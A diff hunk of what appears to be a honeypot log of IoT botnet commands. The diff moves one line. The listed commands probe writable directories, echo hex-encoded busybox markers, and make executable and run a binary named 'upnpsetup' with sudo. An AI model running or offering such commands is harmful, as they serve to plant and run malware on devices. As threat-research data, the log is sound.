@@ -57,12 +57,12 @@ uname -s -m
 ./upnpsetup
 >/var/run/.x&&cd /var/run;>/mnt/.x&&cd /mnt;>/usr/.x&&cd /usr;>/dev/.x&&cd /dev;>/dev/shm/.x&&cd /dev/shm;>/tmp/.x&&cd /tmp;>/var/.x&&cd /var;/bin/busybox echo -e '\x56\x45\x4d\x43\x48\x4f'
 >/var/run/.x&&cd /var/run;>/mnt/.x&&cd /mnt;>/usr/.x&&cd /usr;>/dev/.x&&cd /dev;>/dev/shm/.x&&cd /dev/shm;>/tmp/.x&&cd /tmp;>/var/.x&&cd /var;/bin/busybox echo -e '\x59\x49\x48\x4a\x59\x43'
+Accept-Encoding: gzip
 chmod 777 ./upnpsetup
 hostname
 rm ./upnpsetup
 sudo ./upnpsetup
 uname -m&&pkill upnpsetup
-Accept-Encoding: gzip
 /bin/busybox TEST
 >/var/run/.x&&cd /var/run;>/mnt/.x&&cd /mnt;>/usr/.x&&cd /usr;>/dev/.x&&cd /dev;>/dev/shm/.x&&cd /dev/shm;>/tmp/.x&&cd /tmp;>/var/.x&&cd /var;/bin/busybox echo -e '\x5a\x4b\x53\x44\x48\x51'
 PING
